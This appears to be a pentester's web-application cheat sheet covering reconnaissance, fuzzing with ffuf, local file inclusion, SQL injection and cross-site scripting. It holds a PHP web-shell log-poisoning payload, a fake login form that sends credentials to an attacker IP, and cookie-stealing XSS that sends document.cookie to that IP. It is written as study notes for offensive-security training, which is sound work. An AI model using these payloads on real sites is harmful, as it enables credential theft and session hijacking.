# Hypertext Transfer Protocol

### Source Code Review

_Review source code and Page Contents With Burp Suite/Site Map. Add Target Scope under Target > Scope > Add_

_View Landing Page /_

_Add domain or hostname to Kali /etc/hosts file and review landing page /_

### General Scoping

* _Discover Potential Filename patterns for custom bruteforcing directories and files._
* _Discover usernames or email addresses with exiftool after downloading._
* _Discover HTTP Server Version._
* _Discover JavaScript Version._
* _Search For JavaScript Known Version Vulnerabilities._
* _Discover Web Application Name._
* _Discover Web Application Version._
* _Search For Web Application Known Version Vulnerabilities._
* _check certificate if applicable._
* _Discover Admin Login pages._
* _Test For default credentials._
* _Discover User Logins._
* _Discover User Registrations._

## Screenshot Inspection

### Aquatone

{% code overflow="wrap" %}
```
wget https://github.com/michenriksen/aquatone/releases/download/v1.7.0/aquatone_linux_arm64_1.7.0.zip
```
{% endcode %}

```
cat facebook_aquatone.txt | aquatone -out ./aquatone -screenshot-timeout 1000
```

<figure><img src="../.gitbook/assets/image (32).png" alt=""><figcaption><p>tool for automatic and visual inspection of websites across many hosts and is convenient for quickly gaining an overview of HTTP-based attack surfaces by scanning a list of configurable ports, visiting the website with a headless Chrome browser, and taking a screenshot.</p></figcaption></figure>

### View Certificate Information

_Browse to the `https://$ip/` and view the certificate_

### Server Header Information

```
curl -IL $webserver
```

### Fuzzing Sub-domains

{% code overflow="wrap" %}
```
ffuf -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u https://FUZZ.domain.com/
```
{% endcode %}

### Fuzzing VHOSTs

{% code overflow="wrap" %}
```
ffuf -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://domain.com/ -H 'Host: FUZZ.domain.com' -fs xxx
```
{% endcode %}

### Fuzzing Directories  Files Parameters

_Be sure to test both http and https_

_Extensions_

{% code overflow="wrap" %}
```
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt -u http://domain.com/somedir/indexFUZZ -fc 404
```
{% endcode %}

_Directories_

{% code overflow="wrap" %}
```
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -u http://$ip/FUZZ/ -fc 404
```
{% endcode %}

{% code overflow="wrap" %}
```
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://$ip/FUZZ/ -fc 404
```
{% endcode %}

_Files_

{% code overflow="wrap" %}
```
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files.txt -u http://$ip/FUZZ -fc 404
```
{% endcode %}

{% code overflow="wrap" %}
```
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files-lowercase.txt -u http://$ip/FUZZ -fc 404
```
{% endcode %}

_Parameters_

GET

{% code overflow="wrap" %}
```
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://$ip/somefile?FUZZ=key
```
{% endcode %}

POST

{% code overflow="wrap" %}
```
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://domain.com/path/to/resource.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx
```
{% endcode %}

_Values_

_values can be for example usernames, names, id's_

{% code overflow="wrap" %}
```
ffuf -w values.txt -u http://domain.com/path/to/resource.php -X POST -d 'someParameter=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx
```
{% endcode %}

_Random_

{% code overflow="wrap" %}
```
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt -u http://$ip/FUZZ -fc 404
```
{% endcode %}

### Response Headers

_Search headers such as X-Powered-By. This may reveal vulnerable versioning_

```
curl -I http://$ip/
```

### Command Injection

### Local File inclusion

{% code overflow="wrap" %}
```
ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt -u http://$ip/site/index.php?page=FUZZ
```
{% endcode %}

_Linux_

```
curl http://$ip/ -A "<?php system(\$_GET['cmd']);?>"
```

_Windows_

```
curl http://$ip/site/index.php\?page=../../path/to/log\&cmd=ipconfig
```

### Remote File inclusion

### SQL injection

#### **Authentication Bypass**

Manually confirm the results to then filter out unwanted responses by using --hh

```
wfuzz -c -w /usr/share/seclists/Fuzzing/SQLi/quick-SQLi.txt -d "form" --hc 404 $url
```

```
wfuzz -c -w /usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt -d "form" --hc 404 $url
```

### XXE

## XSS

| Type                             | Description                                                                                                                                                                                                                                  |
| -------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Stored (Persistent) XSS`        | The most critical type of XSS, which occurs when user input is stored on the back-end database and then displayed upon retrieval (e.g., posts or comments)                                                                                   |
| `Reflected (Non-Persistent) XSS` | Occurs when user input is displayed on the page after being processed by the backend server, but without being stored (e.g., search result or error message)                                                                                 |
| `DOM-based XSS`                  | Another Non-Persistent XSS type that occurs when user input is directly shown in the browser and is completely processed on the client-side, without reaching the back-end server (e.g., through client-side HTTP parameters or anchor tags) |

### Testing XSS Payloads

{% code overflow="wrap" %}
```
<img src="" onerror=alert(document.cookie)>
```
{% endcode %}

{% code overflow="wrap" %}
```
'<script>alert(document.cookie)</script>'
```
{% endcode %}

{% code overflow="wrap" %}
```
<script>alert(document.cookie)</script>
```
{% endcode %}

{% code overflow="wrap" %}
```
<script>alert(document.cookie)</script>
```
{% endcode %}

{% code overflow="wrap" %}
```
<script>print()</script>
```
{% endcode %}

{% code overflow="wrap" %}
```
<plaintext>
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (8).png" alt=""><figcaption><p>Many modern web applications utilize cross-domain IFrames to handle user input, so that even if the web form is vulnerable to XSS, it would not be a vulnerability on the main web application. This is why we are showing the value of <code>window.origin</code> in the alert box, instead of a static value like <code>1</code>. In this case, the alert box would reveal the URL it is being executed on, and will confirm which form is the vulnerable one, in case an IFrame was being used.</p></figcaption></figure>

### XSS Discovery Automation

### XSStrike

{% code overflow="wrap" %}
```
git clone https://github.com/s0md3v/XSStrike.git
```
{% endcode %}

{% code overflow="wrap" %}
```
cd XSStrike; pip install -r requirements.txt
```
{% endcode %}

{% code overflow="wrap" %}
```
python xsstrike.py -u "http://SERVER_IP:PORT/somepage.example?example=example" 
```
{% endcode %}

### Phishing

### Login Form Injection

<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption><p>we must inject an HTML code that displays a login form on the targeted page. This form should send the login information to a server we are listening on, such that once a user attempts to log in, we'd get their credentials.</p></figcaption></figure>

{% code overflow="wrap" %}
```
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption><p>the page should look as follows when we visit the malicious URL</p></figcaption></figure>

### Session Hijacking

{% code overflow="wrap" %}
```
new Image().src='http://OUR_IP/?c='+document.cookie
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption><p>Write this js into a "script.js" file. You will need to serve this in a PHP server.</p></figcaption></figure>

```
"><script src="http://OUR_IP/script.js"></script>
```

<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption><p>This is one of many payloads. This payload's main purpose is to have the victim's browser to send a request to our malicious PHP server and executing the code that will give us the cookie. </p></figcaption></figure>

<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption><p>The Victim's activity from the malicious PHP server perspective.</p></figcaption></figure>

<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption><p>Using the cookie editor to place our stolen cookie and then saving the changes</p></figcaption></figure>

<figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption><p>Refresh the page and you will be logged in as that user in this case, admin</p></figcaption></figure>



### Nikto Vulnerability Scanner

```
nikto -h http://$ip
```
